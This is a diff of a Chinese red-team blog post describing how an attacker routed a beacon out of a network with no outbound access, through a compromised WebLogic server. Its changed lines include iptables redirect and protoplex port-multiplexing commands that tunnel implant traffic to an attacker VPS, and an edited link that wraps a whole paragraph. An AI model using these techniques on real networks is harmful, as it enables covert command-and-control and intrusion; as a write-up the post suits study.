@@ -20,7 +20,7 @@
 <meta property="og:image" content="http://example.com/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/image-20210527170511889.png">
 <meta property="og:image" content="http://example.com/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/image-20210527170641484.png">
 <meta property="article:published_time" content="2021-05-27T07:35:43.000Z">
-<meta property="article:modified_time" content="2021-05-27T09:21:52.509Z">
+<meta property="article:modified_time" content="2021-05-27T09:39:23.214Z">
 <meta property="article:author" content="huahua">
 <meta property="article:tag" content="实战攻防">
 <meta name="twitter:card" content="summary">
@@ -191,7 +191,7 @@
 <h5 id="路径二"><a href="#路径二" class="headerlink" title="路径二"></a>路径二</h5><p>由于出网机器B性质为个人开发的pc，因此从A访问B的所有端口都不通是符合逻辑的。这时我想到了之前控制的一批开发网内的服务器，按理说服务器的端口应该是对大家开放的，因此我控制A certutil访问了之前打下来的一个weblogic服务器(linux)的7001端口，这里把这台weblogic命名为C，果然能够请求到内容。然后我使用C curl了B机器的53，发现访问到了vps的8080端口。证明了C和B是通的。</p>
 <p>此时由于我当时获得的weblogic并非root权限，所以没使用iptables转发，而是使用了一款名为iox的工具做转发。将所有发向C的7003端口的流量转发到B的53端口。然后使用A机器certutil访问C的7003，发现不通。然后我在C上执行curl 127.0.0.1:7003，发现流量转发是成功的，可以访问到vps的8080端口。那么很显然限制还是出在网络层。于是我更换C的7003端口为80、8080、53、110等端口尝试bypass，结果都失败了。</p>
 <p>于是我又更换了数台服务器进行操作，发现都是不行。于是这条路径又失败了。</p>
-<h5 id="路径三"><a href="#路径三" class="headerlink" title="路径三"></a>路径三</h5><p>此时，突然想到了之前在“零队”公众号上看到的一篇文章：“frsocks+protoplex+流量重定向实现端口复用”。又看了一次文章后突然茅塞顿开。A可以访问C的7001端口，而C的7001端口使用的是http协议。而如果我在weblogic上做一个端口复用，将访问7001端口的http协议转发到127.0.0.1的7001端口也就是其本身，将访问7001端口的tls协议流量转发到B的53端口。然后我的马使用https上线到C的7001端口岂不是就出来了？</p>
+<h5 id="路径三"><a href="#路径三" class="headerlink" title="路径三"></a>路径三</h5><p>此时，突然想到了之前在“零队”公众号上看到的一篇文章：“frsocks+protoplex+流量重定向实现端口复用”(<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3dvBMyRyjnmS_ITc6a6ABw)%E3%80%82%E5%8F%88%E7%9C%8B%E4%BA%86%E4%B8%80%E6%AC%A1%E6%96%87%E7%AB%A0%E5%90%8E%E7%AA%81%E7%84%B6%E8%8C%85%E5%A1%9E%E9%A1%BF%E5%BC%80%E3%80%82A%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AEC%E7%9A%847001%E7%AB%AF%E5%8F%A3%EF%BC%8C%E8%80%8CC%E7%9A%847001%E7%AB%AF%E5%8F%A3%E4%BD%BF%E7%94%A8%E7%9A%84%E6%98%AFhttp%E5%8D%8F%E8%AE%AE%E3%80%82%E8%80%8C%E5%A6%82%E6%9E%9C%E6%88%91%E5%9C%A8weblogic%E4%B8%8A%E5%81%9A%E4%B8%80%E4%B8%AA%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%EF%BC%8C%E5%B0%86%E8%AE%BF%E9%97%AE7001%E7%AB%AF%E5%8F%A3%E7%9A%84http%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91%E5%88%B0127.0.0.1%E7%9A%847001%E7%AB%AF%E5%8F%A3%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%85%B6%E6%9C%AC%E8%BA%AB%EF%BC%8C%E5%B0%86%E8%AE%BF%E9%97%AE7001%E7%AB%AF%E5%8F%A3%E7%9A%84tls%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%E5%88%B0B%E7%9A%8453%E7%AB%AF%E5%8F%A3%E3%80%82%E7%84%B6%E5%90%8E%E6%88%91%E7%9A%84%E9%A9%AC%E4%BD%BF%E7%94%A8https%E4%B8%8A%E7%BA%BF%E5%88%B0C%E7%9A%847001%E7%AB%AF%E5%8F%A3%E5%B2%82%E4%B8%8D%E6%98%AF%E5%B0%B1%E5%87%BA%E6%9D%A5%E4%BA%86%EF%BC%9F">https://mp.weixin.qq.com/s/3dvBMyRyjnmS_ITc6a6ABw)。又看了一次文章后突然茅塞顿开。A可以访问C的7001端口，而C的7001端口使用的是http协议。而如果我在weblogic上做一个端口复用，将访问7001端口的http协议转发到127.0.0.1的7001端口也就是其本身，将访问7001端口的tls协议流量转发到B的53端口。然后我的马使用https上线到C的7001端口岂不是就出来了？</a></p>
 <p>C机器执行：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp -m tcp  -s B所在的b段ip&#x2F;16  --dport 7001 -j REDIRECT --to-ports 9999</span><br><span class="line">.&#x2F;protoplex --http 127.0.0.1:7001 --tls Aip:53 -b cip:9999</span><br></pre></td></tr></table></figure>
 
@@ -211,6 +211,7 @@
 <p><img src="/2021/05/27/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9E%81%E7%AB%AF%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91%E6%9C%BA%E5%99%A8%E4%B8%8A%E7%BA%BF/image-20210527170641484.png" alt="image-20210527170641484"></p>
 <p>推波博客，大佬轻喷</p>
 <p><a target="_blank" rel="noopener" href="https://flowerwind.github.io/">https://flowerwind.github.io/</a></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3dvBMyRyjnmS_ITc6a6ABw">https://mp.weixin.qq.com/s/3dvBMyRyjnmS_ITc6a6ABw</a></p>
 
       
 
